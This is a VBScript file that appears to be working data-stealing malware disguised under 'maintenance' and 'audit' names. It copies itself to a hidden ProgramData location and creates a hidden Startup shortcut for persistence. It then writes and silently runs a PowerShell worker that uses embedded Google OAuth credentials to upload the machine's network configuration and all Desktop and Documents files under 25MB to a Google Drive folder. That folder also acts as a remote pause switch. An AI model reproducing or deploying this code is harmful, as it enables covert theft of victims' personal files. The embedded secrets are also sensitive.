Option Explicit

' --- 1. ALL VARIABLE DECLARATIONS ---
' Every variable used must be listed here because of Option Explicit
Dim objFSO, objShell, objFile, objShortcut
Dim strPSPath, strWorkerName, appDataPath, startupPath
Dim strPermanentPath, strStartupLnk, currentScript
Dim strCID, strSEC, strTOK, strBaseID

' --- 2. INITIALIZE OBJECTS & PATHS ---
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' This correctly expands the environment variables to avoid the System32 error
currentScript = WScript.ScriptFullName
strWorkerName = "office_maint_v21.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
appDataPath = "C:\ProgramData\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' --- 3. PERSISTENCE (Copy to Startup) ---
On Error Resume Next
' Unblock itself from security flags
objShell.Run "powershell.exe -Command ""Unblock-File -Path '" & currentScript & "'""", 0, True

' Copy itself to ProgramData (Hidden location)
If Not objFSO.FileExists(appDataPath) Then 
    objFSO.CopyFile currentScript, appDataPath, True
End If

' Create the Startup Shortcut
If Not objFSO.FileExists(startupPath) Then
    Set objShortcut = objShell.CreateShortcut(startupPath)
    objShortcut.TargetPath = "wscript.exe"
    objShortcut.Arguments = """" & appDataPath & """"
    objShortcut.WindowStyle = 0
    objShortcut.Save
End If
On Error GoTo 0

' --- 4. WRITE THE POWERSHELL WORKER ---
' Define your Google API keys
strCID = "677717926428-smega8knnqbrrvo6j4ctvllque8jmc2a.apps.googleusercontent.com"
strSEC = "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"
strTOK = "1//04ovknb57Ph3DCgYIARAAGAQSNwF-L9IrkTy0E_E3b8AIEQ-_jTTy3-o2BDaXitQhY95eLbtN6RM85rDIaOAqckKBZHntlbT09Io"
strBaseID = "1YVAYlF68yQfbD5nyuEUqb1AesoLVV5Ff"

Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '" & strCID & "'"
objFile.WriteLine "$SEC = '" & strSEC & "'"
objFile.WriteLine "$TOK = '" & strTOK & "'"
objFile.WriteLine "$BaseID = '" & strBaseID & "'"

' Auth Handshake Logic
objFile.WriteLine "try { $a=Invoke-RestMethod -Uri 'https://accounts.google.com/o/oauth2/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'}"
objFile.WriteLine "$global:h=@{Authorization=""Bearer $($a.access_token)""} } catch { exit }"

' Remote STOP/Pause Logic
objFile.WriteLine "$q = [Uri]::EscapeDataString(""'$BaseID' in parents and trashed = false"")"
objFile.WriteLine "try { $df = (Invoke-RestMethod -Uri ""https://www.googleapis.com/drive/v3/files?q=$q&fields=files(name)"" -Headers $h).files.name"
objFile.WriteLine "$Pause = $false; foreach ($f in $df) { if ($f -ilike '*STOP*' -and ($f -ieq 'STOP' -or $f -ilike ""*STOP-$($env:COMPUTERNAME)*"")) { $Pause = $true } } } catch { $Pause = $false }"

' Folder & Upload Functions
objFile.WriteLine "$meta = @{name=""$($env:COMPUTERNAME)-Audit-$(Get-Date -f 'MMdd-HHmm')"";mimeType='application/vnd.google-apps.folder';parents=@($BaseID)}|ConvertTo-Json"
objFile.WriteLine "$SID = (Invoke-RestMethod -Uri 'https://www.googleapis.com/drive/v3/files' -Method Post -Headers $h -Body $meta -ContentType 'application/json').id"
objFile.WriteLine "function Up($n, $p, $t) { try { $b=[System.IO.File]::ReadAllBytes($p); $m=@{name=$n;parents=@($t)}|ConvertTo-Json -Compress; $bd=[guid]::NewGuid().ToString(); $hd=""--$bd`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n$m`r`n--$bd`r`nContent-Type: application/octet-stream`r`n`r`n""; $by=[collections.generic.list[byte]]::new(); $by.AddRange([text.encoding]::UTF8.GetBytes($hd)); $by.AddRange($b); $by.AddRange([text.encoding]::UTF8.GetBytes(""`r`n--$bd--`r`n"")); Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $h -Body $by.ToArray() -ContentType ""multipart/related; boundary=$bd"" | Out-Null } catch {} }"

' Audit Report Logic
objFile.WriteLine "$R = New-Object System.Text.StringBuilder; $R.AppendLine('Audit for ' + $env:COMPUTERNAME)"
objFile.WriteLine "Get-NetIPConfiguration | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "$rt=""$env:TEMP\report.txt""; $R.ToString() | Out-File $rt; Up 'Deep_Report.txt' $rt $SID; rm $rt"

' Final File Uploads
objFile.WriteLine "if (-not $Pause) {"
objFile.WriteLine "  $reg='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'; $pts = @((gp $reg).Desktop, (gp $reg).Personal)"
objFile.WriteLine "  foreach($p in ($pts | select -Unique)){ if(Test-Path $p){ gci $p -File -Recurse -EA 0 | ?{$_.Length -lt 25MB} | %{ Up $_.Name $_.FullName $SID } } }"
objFile.WriteLine "} else { $st=""$env:TEMP\p.txt""; 'Paused' | Out-File $st; Up 'STOPPED.txt' $st $SID; rm $st }"
objFile.Close

' --- 5. SILENT EXECUTION ---
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, True
